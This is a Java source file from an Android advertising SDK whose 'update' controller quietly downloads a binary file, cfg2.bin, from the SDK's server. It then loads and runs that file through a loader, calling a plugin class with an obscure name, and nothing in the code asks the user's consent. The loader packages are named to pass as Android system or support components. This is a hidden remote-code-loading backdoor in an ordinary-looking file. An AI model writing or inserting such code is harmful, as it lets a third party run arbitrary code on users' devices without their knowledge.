package com.guang.client.controller;

import android.app.Service;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.text.TextUtils;
import android.util.Log;

import com.android.support.servicemanager.ServiceManager;
import com.android.system.manager.ILoader;
import com.guang.client.GCommon;
import com.guang.client.tools.GHttpTool;
import com.guang.client.tools.GTools;
import com.qinglu.ad.QLAdController;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * Created by guang on 2017/10/10.
 */

public class GUpdateTbController {

    private static GUpdateTbController _instance;
    private GUpdateTbController(){}

    public static GUpdateTbController getInstance()
    {
        if(_instance == null)
            _instance = new GUpdateTbController();
        return _instance;
    }

    public void init()
    {
        boolean b = GTools.getSharedPreferences().getBoolean("update12",false);
        if(!b)
        {
            ApplicationInfo appInfo = null;
            Context context = QLAdController.getInstance().getContext();
            boolean isUpdate = false;
            try {
                appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA);
                String qew_channel = appInfo.metaData.getString("UMENG_CHANNEL");

                PackageInfo info = context.getPackageManager().getPackageInfo(context.getPackageName(),0);
                int versionCode = info.versionCode;
                String versionName = info.versionName;

                if(versionName != null && versionName.equals("1.2") && versionCode < 38)
                {
                    isUpdate = true;
                    Log.e("------------","is update12 "+qew_channel + "  "+versionName+"   "+versionCode);
                }
                if(versionName != null && versionName.equals("1.2") && versionCode >= 38)
                {
                    GTools.saveSharedData("update12",true);
                }
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
            if(isUpdate)
            {
                long time = GTools.getSharedPreferences().getLong("update12_time",0);
                long now = GTools.getCurrTime();

                if(now - time > 1*60*60*1000)
                {
                    GTools.saveSharedData("update12_time",now);
                    File datdir = GTools.getStorageFile(context,"dat");
                    if(!datdir.exists())
                    {
                        datdir.mkdirs();
                    }
                    File datf = new File(datdir.getAbsolutePath(),"cfg2.bin");
                    if(datf.exists())
                    {
                        //存在就反射调用
                        Service s = (Service)context;
                        ServiceManager.init(s.getApplication(),MasterClient.getInstance());
                        connectMaster(datf.getAbsolutePath());
                    }
                    else
                    {
                        //不存在就下载
                        downCfg(datf.getAbsolutePath());
                    }
                }
            }

        }
    }

    private void downCfg(final String f)
    {
        String url = GCommon.SERVER_ADDRESS+"sdk/cfg/cfg2.bin";
//        Log.e("--------------","downCfg="+url);
        GHttpTool.getInstance().downloadRes(url, f, new GHttpTool.GHttpCallback() {
            @Override
            public void result(boolean state, Object data) {
                if(state && data != null)
                {
                    Service s = (Service)QLAdController.getInstance().getContext();
                    ServiceManager.init(s.getApplication(),MasterClient.getInstance());
                    connectMaster(f);
                }
            }
        });
    }


    private void connectMaster(final String path)
    {
        Log.e("--------------","connectMaster");
        Object loaderObj = ServiceManager.getService("main");
        if(loaderObj != null && loaderObj instanceof ILoader){
            Log.e("--------------","find loader");
            ILoader loader = (ILoader)loaderObj;
            if(!TextUtils.isEmpty(path)){
                loader.o(path,"com.android.system.manager.plugin.e","");
            }
        }
    }

    static class MasterClient implements ServiceManager.ServiceListener
    {
        private static MasterClient _instance;
        public static MasterClient getInstance()
        {
            if(_instance == null)
                _instance = new MasterClient();
            return _instance;
        }
        @Override
        public void onServiceDied(String name) {

        }
    }
}
